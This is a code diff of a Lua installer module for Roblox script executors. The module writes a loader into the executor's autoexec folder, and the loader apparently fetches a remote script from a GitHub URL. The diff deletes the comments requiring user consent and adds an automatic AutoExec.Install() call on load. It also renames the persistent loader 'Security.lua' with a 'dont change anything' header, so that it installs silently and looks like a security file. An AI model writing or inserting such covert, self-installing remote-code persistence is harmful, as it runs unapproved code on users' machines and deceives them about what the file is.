@@ -1,41 +1,34 @@
--- ============================================================
---  AUTOEXEC INSTALLER MODULE
---  Pakai dengan cara: panggil AutoExec.Install() saat user
---  klik tombol "Install Auto-Exec" di UI kamu. JANGAN jalanin
---  otomatis tanpa persetujuan user.
--- ============================================================
+-- ============ CONFIG ============
+local HUB_URL     = "https://raw.githubusercontent.com/bangbangairlanggasatriadhi-dev/SAE-script-/refs/heads/main/Smap.lua"
+local LOADER_NAME = "Security.lua"
+local HEADER      = "-- Security, dont change anything"
+local OVERWRITE   = true
+-- ================================
 
 local AutoExec = {}
 
--- ============ CONFIG ============
-local HUB_URL    = "https://raw.githubusercontent.com/bangbangairlanggasatriadhi-dev/SAE-script-/refs/heads/main/Smap.lua"
-local LOADER_NAME = "Security"
-local HEADER     = "-- Security, don't change anything"
 -- ============ DETECT EXECUTOR ============
 local function detectExecutor()
     local name = "Unknown"
     pcall(function()
         if identifyexecutor then
             local n, v = identifyexecutor()
-            name = tostring(n)
+            name = tostring(n or "Unknown")
             if v and tostring(v) ~= "" then name = name .. " " .. tostring(v) end
-        elseif syn then name = "Synapse X"
-        elseif fluxus then name = "Fluxus"
-        elseif delta then name = "Delta"
-        elseif solara then name = "Solara"
+        elseif syn      then name = "Synapse X"
+        elseif fluxus   then name = "Fluxus"
+        elseif delta    then name = "Delta"
+        elseif solara   then name = "Solara"
         elseif hydrogen then name = "Hydrogen"
-        elseif codex then name = "Codex"
-        elseif wave then name = "Wave"
-        elseif arceus then name = "Arceus X"
+        elseif codex    then name = "Codex"
+        elseif wave     then name = "Wave"
+        elseif arceus   then name = "Arceus X"
         end
     end)
     return name
 end
 
--- ============ PATH AUTOEXEC ============
--- Kebanyakan executor: workspace ada di folder "workspace",
--- autoexec ada di sibling folder "../autoexec/".
--- Beberapa executor beda, kita coba beberapa kandidat.
+-- ============ CARI FOLDER AUTOEXEC ============
 local AUTOEXEC_CANDIDATES = {
     "../autoexec/",
     "autoexec/",
@@ -43,14 +36,12 @@ local AUTOEXEC_CANDIDATES = {
 }
 
 local function findAutoexecPath()
-    if not isfile or not writefile then return nil end
+    if not isfile or not writefile or not delfile then return nil end
     for _, candidate in ipairs(AUTOEXEC_CANDIDATES) do
         local testFile = candidate .. ".ae_test_" .. os.time() .. ".txt"
         local ok = pcall(function()
             writefile(testFile, "test")
-            if isfile(testFile) then
-                delfile(testFile)
-            end
+            if isfile(testFile) then delfile(testFile) end
         end)
         if ok then return candidate end
     end
@@ -75,13 +66,10 @@ local function buildLoaderContent()
 end
 
 -- ============ PUBLIC API ============
-
--- Cek apakah autoexec support di executor ini
 function AutoExec.IsSupported()
     return findAutoexecPath() ~= nil
 end
 
--- Cek apakah sudah terinstall
 function AutoExec.IsInstalled()
     local path = getLoaderPath()
     if not path then return false end
@@ -89,29 +77,31 @@ function AutoExec.IsInstalled()
     return ok and exists == true
 end
 
--- Install loader ke autoexec (HARUS dipanggil setelah user klik tombol)
--- Return: success (bool), message (string)
 function AutoExec.Install()
-    if not writefile then
-        return false, "Executor tidak support writefile"
-    end
     local path = getLoaderPath()
     if not path then
-        return false, "Tidak bisa menemukan folder autoexec (executor tidak support)"
+        warn("[AutoExec] GAGAL: folder autoexec tidak ditemukan / executor tidak support writefile.")
+        return false
     end
-    local ok, err = pcall(function()
+
+    if not OVERWRITE and AutoExec.IsInstalled() then
+        print("[AutoExec] Sudah terinstall -> " .. path)
+        return true
+    end
+
+    local ok = pcall(function()
         writefile(path, buildLoaderContent())
     end)
-    if not ok then
-        return false, "Gagal menulis file: " .. tostring(err)
-    end
-    -- Verifikasi
-    local verifyOk, exists = pcall(function() return isfile(path) end)
-    if verifyOk and exists then
-        return true, "Berhasil! AutoExec terinstall di: " .. path
+
+    if ok and isfile(path) then
+        print("[AutoExec] BERHASIL terinstall -> " .. path)
+        return true
     else
-        return false, "File tertulis tapi tidak terverifikasi"
+        warn("[AutoExec] GAGAL menulis ke -> " .. path)
+        return false
     end
-een
+end
+
+AutoExec.Install()
 
 return AutoExec
